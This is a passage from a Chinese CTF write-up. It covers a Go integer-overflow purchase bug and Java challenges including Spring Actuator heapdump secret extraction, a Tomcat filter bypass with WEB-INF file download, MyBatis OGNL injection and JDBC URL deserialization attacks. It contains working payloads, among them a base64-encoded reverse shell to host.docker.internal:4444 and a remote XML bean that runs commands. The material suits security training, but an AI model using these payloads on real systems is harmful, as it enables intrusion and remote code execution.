
```go
func BuyHandler(c *gin.Context) {
	s := sessions.Default(c)
	user := users[s.Get("id").(string)]

	data := make(map[string]interface{})
	c.ShouldBindJSON(&data)

	var product *Product

	for _, v := range products {
		if data["name"] == v.Name {
			product = v
			break
		}
	}

	if product == nil {
		c.JSON(200, gin.H{
			"message": "No such product",
		})
		return
	}

	n, _ := strconv.Atoi(data["num"].(string))

	if n < 0 {
		c.JSON(200, gin.H{
			"message": "Product num can't be negative",
		})
		return
	}

	if user.Money >= product.Price*int64(n) {
		user.Money -= product.Price * int64(n)
		user.Items[product.Name] += int64(n)
		c.JSON(200, gin.H{
			"message": fmt.Sprintf("Buy %v * %v success", product.Name, n),
		})
	} else {
		c.JSON(200, gin.H{
			"message": "You don't have enough money",
		})
	}
}
```

程序使用了 `strconv.Atoi(data["num"].(string))` 将 json 传递的 num 字符串转换成了 int 类型的变量 n

后面判断用户的 money 时将其转换成了 int64 类型, 而 product.Price 本身也是 int64 类型

```go
if user.Money >= product.Price*int64(n) {
  user.Money -= product.Price * int64(n)
  user.Items[product.Name] += int64(n)
  c.JSON(200, gin.H{
    "message": fmt.Sprintf("Buy %v * %v success", product.Name, n),
  })
} else {
  c.JSON(200, gin.H{
    "message": "You don't have enough money",
  })
}
```

这里先介绍一些概念

Go 语言是强类型语言, 包含多种数据类型, 以数字类型为例, 存在 uint8 uint16 uint32 uint64 (无符号整型) 和 int8 int16 int32 int64 (有符号整型) 等类型

Go 语言在编译期会检查源码中定义的变量是否存在溢出, 例如 `var i uint8 = 99999` 会使得编译不通过, 但是并不会检查变量的运算过程中是否存在溢出, 例如 `var i uint8 = a * b`, 如果程序没有对变量的取值范围做限制, 那么在部分场景下就可能存在整数溢出漏洞

上面的 BuyHandler 虽然限制了 n 不能为负数, 但是并没有限制 n 的最大值

因此我们可以控制 n, 使得 `product.Price * int64(n)` 溢出为一个负数, 之后进行 `user.Money -= product.Price * int64(n)` 运算的时候, 当前用户的 money 就会增加, 最终达到一个可以购买 flag 商品的金额, 从而拿到 flag

查阅相关文档可以知道 int64 类型的范围是 `-9223372036854775808 ~ 9223372036854775807`

经过简单的计算或者瞎猜, 可以购买数量为 `922337203695477808` 的 apple

![image-20230930165439162](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021207038.png)

最终购买 flag

![image-20230930165503456](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021207723.png)

## Week 4

> Week 4 算是一个 Java 安全专题, 不过并没有考一些对新生来说比较深入复杂的东西例如各种 gadget (利用链) 的原理
>
> 题目考的都是一些常见的 Java 知识点, 比如很经典的传入 Runtime.exec 的命令需要编码, pom.xml 和 WEB-INF 的作用, ysoserial 工具的使用等等
>
> Web 方向以后无论是打 CTF 还是搞安全研究/红队攻防, 都会或多或少接触到一些 Java 安全的内容, 希望对 Web 感兴趣的同学能够认真消化本周题目中涉及到的知识点~

### spring

考点: Spring Actuator heapdump 利用

根据 index 页面的提示可以知道为 spring actuator

参考文章: https://xz.aliyun.com/t/9763

访问 `/actuator/env` 可以发现 app.username 和 app.password 这两个环境变量

![image-20230930175030210](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021207572.png)

app.username 提示 flag 就在 app.password 里面, 但是它的 value 全是星号, 这里其实被 spring 给隐藏了

spring actuator 默认会把含有 password secret 之类关键词的变量的值改成星号, 防止敏感信息泄露

但是我们可以通过 `/actuator/heapdump` 这个路由去导出 jvm 中的堆内存信息, 然后通过一定的查询得到 app.password 的明文

https://github.com/whwlsfb/JDumpSpider

或者用其它工具比如 Memory Analyze Tool (MAT) 也行

```bash
$ JDumpSpider java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump
......
===========================================
OriginTrackedMapPropertySource
-------------
management.endpoints.web.exposure.include = *
server.port = null
management.endpoints.web.exposure.exclude = shutdown,refresh,restart
app.password = 0xGame{1abbac75-e230-4390-9148-28c71e0098b9}
app.username = flag_is_the_password

......
```

用 MAT 的话查询语句如下

```sql
SELECT * FROM java.util.LinkedHashMap$Entry x WHERE(toString(x.key).contains("app.password"))
```

### auth_bypass

考点: Tomcat Filter 绕过 + Java 任意文件下载搭配 WEB-INF 目录的利用

题目附件给了 AuthFilter.java 和 DownloadServlet.java

DownloadServlet 很明显存在任意文件下载, 但是 AuthFilter 限制不能访问 `/download` 路由

```java
if (request.getRequestURI().contains("..")) {
    resp.getWriter().write("blacklist");
    return;
}

if (request.getRequestURI().startsWith("/download")) {
    resp.getWriter().write("unauthorized access");
} else {
    chain.doFilter(req, resp);
}
```

根据网上的文章可以知道, 直接通过 getRequestURI() 得到的 url 路径存在一些问题, 比如不会自动 urldecode, 也不会进行标准化 (去除多余的 `/` 和 `..`)

这里 `..` 被过滤了, 所以直接访问 `//download` 就能绕过, 后面目录穿越下载文件的时候可以将 `..` 进行一次 url 编码

然后可以通过 `//download?filename=avatar.jpg` 下载文件, 但是无法读取 `/flag` (提示 Permission denied), 那么很明显需要 RCE

根据题目描述, 网站使用 war 打包

这个 war 其实也就相当于压缩包, Tomcat 在部署 war 的时候会将其解压, 而压缩包内会存在一个 WEB-INF 目录, 目录里面包含编译好的 .class 文件以及 web.xml (保存路由和类的映射关系)

下载 web.xml

```
//download?filename=%2e%2e/WEB-INF/web.xml
```

xml 内容

```xml
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">

    <servlet>
        <servlet-name>IndexServlet</servlet-name>
        <servlet-class>com.example.demo.IndexServlet</servlet-class>
    </servlet>
    <servlet>
        <servlet-name>DownloadServlet</servlet-name>
        <servlet-class>com.example.demo.DownloadServlet</servlet-class>
    </servlet>
    <servlet>
        <servlet-name>EvilServlet</servlet-name>
        <servlet-class>com.example.demo.EvilServlet</servlet-class>
    </servlet>

    <servlet-mapping>
        <servlet-name>IndexServlet</servlet-name>
        <url-pattern>/</url-pattern>
    </servlet-mapping>
    <servlet-mapping>
        <servlet-name>DownloadServlet</servlet-name>
        <url-pattern>/download</url-pattern>
    </servlet-mapping>
    <servlet-mapping>
        <servlet-name>EvilServlet</servlet-name>
        <url-pattern>/You_Find_This_Evil_Servlet_a76f02cb8422</url-pattern>
    </servlet-mapping>
    
    <filter>
        <filter-name>AuthFilter</filter-name>
        <filter-class>com.example.demo.AuthFilter</filter-class>
    </filter>

    <filter-mapping>
        <filter-name>AuthFilter</filter-name>
        <url-pattern>/*</url-pattern>
    </filter-mapping>
</web-app>
```

存在 EvilServlet, 映射的路由为 `/You_Find_This_Evil_Servlet_a76f02cb8422`

根据网上文章的知识点, 通过包名 (com.example.demo.EvilServlet) 构造对应的 class 文件路径并下载

```
//download?filename=%2e%2e/WEB-INF/classes/com/example/demo/EvilServlet.class
```

用 JD-GUI 或者其它 Java class 反编译工具打开

```java
import java.io.IOException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class EvilServlet extends HttpServlet {
  protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws IOException {
    String cmd = req.getParameter("Evil_Cmd_Arguments_fe37627fed78");
    try {
      Runtime.getRuntime().exec(cmd);
      resp.getWriter().write("success");
    } catch (Exception e) {
      resp.getWriter().write("error");
    } 
  }
}
```

直接 POST 访问 `/You_Find_This_Evil_Servlet_a76f02cb8422` 传个参就能执行命令

最后因为没有回显, 需要反弹 shell 或者通过 curl + burp collaborator 外带 flag

```
POST /You_Find_This_Evil_Servlet_a76f02cb8422 HTTP/1.1
Host: 127.0.0.1:50042
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 143

Evil_Cmd_Arguments_fe37627fed78=bash+-c+{echo,YmFzaCAtaSA%2bJiAvZGV2L3RjcC9ob3N0LmRvY2tlci5pbnRlcm5hbC80NDQ0IDA%2bJjE%3d}|{base64,-d}|{bash,-i}
```

![image-20230930183841704](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021208261.png)

![image-20230930183910475](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021208689.png)

这里首先得注意传入 Runtime.exec 的命令需要进行一次编码

https://www.adminxe.com/tools/code.html

https://ares-x.com/tools/runtime-exec/

https://github.com/Threekiii/Awesome-Redteam/blob/master/scripts/runtime-exec-payloads.html

具体原因大家可以参考下面两篇文章

https://www.anquanke.com/post/id/243329

https://y4er.com/posts/java-exec-command/

然后 POST 传递命令时得先 urlencode 一次

### YourBatis

考点: MyBatis 低版本 OGNL 注入

首先关注 pom.xml, 通过这个文件可以查看 jar 包使用的第三方库

```xml
<dependency>
    <groupId>org.mybatis.spring.boot</groupId>
    <artifactId>mybatis-spring-boot-starter</artifactId>
    <version>2.1.1</version>
</dependency>
```

存在 mybatis 依赖, 版本 2.1.1, 该版本存在 OGNL 表达式注入, 网上搜搜就有相关的利用文章

https://www.cnpanda.net/sec/1227.html

https://forum.butian.net/share/1749

这有一个小坑, 如果 jar 包使用 JD-GUI 反编译的话就无法正常得到 UserSqlProvider 这个类的内容, 必须得使用 IDEA 自带的反编译器或者 Jadx-GUI 等其它工具才行

UserSqlProvider.class

```java
package com.example.yourbatis.provider;

import org.apache.ibatis.jdbc.SQL;

public class UserSqlProvider {
    public UserSqlProvider() {
    }

    public String buildGetUsers() {
        return (new SQL() {
            {
                this.SELECT("*");
                this.FROM("users");
            }
        }).toString();
    }

    public String buildGetUserByUsername(final String username) {
        return (new SQL() {
            {
                this.SELECT("*");
                this.FROM("users");
                this.WHERE(String.format("username = '%s'", username));
            }
        }).toString();
    }
}
```

根据参考文章可以知道这里的 username 被直接拼接进 SQL 语句, 存在 SQL 注入, 但是更进一步来讲这里存在 OGNL 表达式注入

直接反弹 shell

```json
${@java.lang.Runtime@getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9ob3N0LmRvY2tlci5pbnRlcm5hbC80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}")}
```

但是很显然是会失败的, 因为传入的命令包含了 `{` 和 `}`, 会被递归解析为另一个 OGNL 表达式的开头和结尾

这个点可能比较难, 所以后面给出了 hint

解决方案是只要不出现大括号就行, 方法很多, 这里给出一种, 利用 OGNL 调用 Java 自身的 base64 decode 方法

```json
${@java.lang.Runtime@getRuntime().exec(new java.lang.String(@java.util.Base64@getDecoder().decode('YmFzaCAtYyB7ZWNobyxZbUZ6YUNBdGFTQStKaUF2WkdWMkwzUmpjQzlvYjNOMExtUnZZMnRsY2k1cGJuUmxjbTVoYkM4ME5EUTBJREErSmpFPX18e2Jhc2U2NCwtZH18e2Jhc2gsLWl9Cg==')))}
```

urlencode 全部字符后发送, 反弹 shell, 查看环境变量拿到 flag

![image-20230930191043521](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021208262.png)

![image-20230930190822099](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021208739.png)

### TestConnection

考点: MySQL / PostgreSQL JDBC URL Attack

JDBC 就是 Java 用于操作数据库的接口, 通过一个统一规范的 JDBC 接口可以实现同一段代码兼容不同类型数据库的访问

JDBC URL 就是用于连接数据库的字符串, 格式为 `jdbc:db-type://host:port/db-name?param=value`

db-type 就是数据库类型, 例如 postgresql, mysql, mssql, oracle, sqlite

db-name 是要使用的数据库名

param 是要传入的参数, 比如 user, password, 指定连接时使用的编码类型等等

当 jdbc url 可控时, 如果目标网站使用了旧版的数据库驱动, 在特定情况下就可以实现 RCE

参考文章:

https://tttang.com/archive/1877/

https://xz.aliyun.com/t/11812

https://forum.butian.net/share/1339

pom.xml

```xml
<dependency>
    <groupId>mysql</groupId>
    <artifactId>mysql-connector-java</artifactId>
    <version>8.0.11</version>
    <scope>runtime</scope>
</dependency>

<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.2.1</version>
</dependency>

<dependency>
    <groupId>org.postgresql</groupId>
    <artifactId>postgresql</artifactId>
    <version>42.3.1</version>
    <scope>runtime</scope>
</dependency>
</dependencies>
```

给了两个依赖, mysql 和 postgresql, 对应两种利用方式

然后还有 commons-collections 依赖, 这个主要是方便大家在后面用 ysoserial 工具去生成反序列化 payload

首先是 mysql 驱动的利用

结合网上文章可以构造对应的 jdbc url

```
jdbc:mysql://host.docker.internal:3308/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor
```

首先得注意, 因为题目给的代码是 `DriverManager.getConnection(url, username, password);`, 即会单独传入一个 username 参数, 因此 url 中的 username 会被后面的 username 给覆盖

网上的部分利用工具会通过 username 来区分不同的 payload, 所以得注意 username 要单独传, 不然写在 url 里面就被覆盖了

其次, 因为 jdbc url 本身也符合 url 的规范, 所以在传 url 参数的时候, 需要把 url 本身全部进行 url 编码, 防止服务器错把 autoDeserialize, queryInterceptors 这些参数当成是一个 http get 参数, 而不是 jdbc url 里面的参数

最后依然是 Runtime.exec 命令编码的问题

一些 mysql jdbc 利用工具

https://github.com/4ra1n/mysql-fake-server

https://github.com/rmb122/rogue_mysql_server

payload

```
/testConnection?driver=com.mysql.cj.jdbc.Driver&url=jdbc:mysql://host.docker.internal:3308/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&username=deser_CC31_bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9ob3N0LmRvY2tlci5pbnRlcm5hbC80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}&password=123
```

url 编码

```
/testConnection?driver=com.mysql.cj.jdbc.Driver&url=%6a%64%62%63%3a%6d%79%73%71%6c%3a%2f%2f%68%6f%73%74%2e%64%6f%63%6b%65%72%2e%69%6e%74%65%72%6e%61%6c%3a%33%33%30%38%2f%74%65%73%74%3f%61%75%74%6f%44%65%73%65%72%69%61%6c%69%7a%65%3d%74%72%75%65%26%71%75%65%72%79%49%6e%74%65%72%63%65%70%74%6f%72%73%3d%63%6f%6d%2e%6d%79%73%71%6c%2e%63%6a%2e%6a%64%62%63%2e%69%6e%74%65%72%63%65%70%74%6f%72%73%2e%53%65%72%76%65%72%53%74%61%74%75%73%44%69%66%66%49%6e%74%65%72%63%65%70%74%6f%72&username=%64%65%73%65%72%5f%43%43%33%31%5f%62%61%73%68%20%2d%63%20%7b%65%63%68%6f%2c%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%39%6f%62%33%4e%30%4c%6d%52%76%59%32%74%6c%63%69%35%70%62%6e%52%6c%63%6d%35%68%62%43%38%30%4e%44%51%30%49%44%41%2b%4a%6a%45%3d%7d%7c%7b%62%61%73%65%36%34%2c%2d%64%7d%7c%7b%62%61%73%68%2c%2d%69%7d&password=123
```

![image-20231101212444166](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021208439.png)

![image-20231101212451632](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021208250.png)

flag 在环境变量里面

![image-20231101212504693](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021208321.png)

当然也可以利用 postgresql 驱动, 这个更简单一些

根据参考文章, 起一个 http 服务器, 构造 xml

```xml
<?xml version="1.0" encoding="UTF-8" ?>
    <beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
        <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
            <constructor-arg >
            <list>
                <value>bash</value>
                <value>-c</value>
                <value>{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9ob3N0LmRvY2tlci5pbnRlcm5hbC80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}</value>
            </list>
            </constructor-arg>
        </bean>
    </beans>
```

payload

```
/testConnection?driver=org.postgresql.Driver&url=jdbc:postgresql://127.0.0.1:5432/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://host.docker.internal:8000/poc.xml&username=123&password=123
```

url 编码

```
/testConnection?driver=org.postgresql.Driver&url=%6a%64%62%63%3a%70%6f%73%74%67%72%65%73%71%6c%3a%2f%2f%31%32%37%2e%30%2e%30%2e%31%3a%35%34%33%32%2f%74%65%73%74%3f%73%6f%63%6b%65%74%46%61%63%74%6f%72%79%3d%6f%72%67%2e%73%70%72%69%6e%67%66%72%61%6d%65%77%6f%72%6b%2e%63%6f%6e%74%65%78%74%2e%73%75%70%70%6f%72%74%2e%43%6c%61%73%73%50%61%74%68%58%6d%6c%41%70%70%6c%69%63%61%74%69%6f%6e%43%6f%6e%74%65%78%74%26%73%6f%63%6b%65%74%46%61%63%74%6f%72%79%41%72%67%3d%68%74%74%70%3a%2f%2f%68%6f%73%74%2e%64%6f%63%6b%65%72%2e%69%6e%74%65%72%6e%61%6c%3a%38%30%30%30%2f%70%6f%63%2e%78%6d%6c&username=123&password=123
```

最终也是一样的效果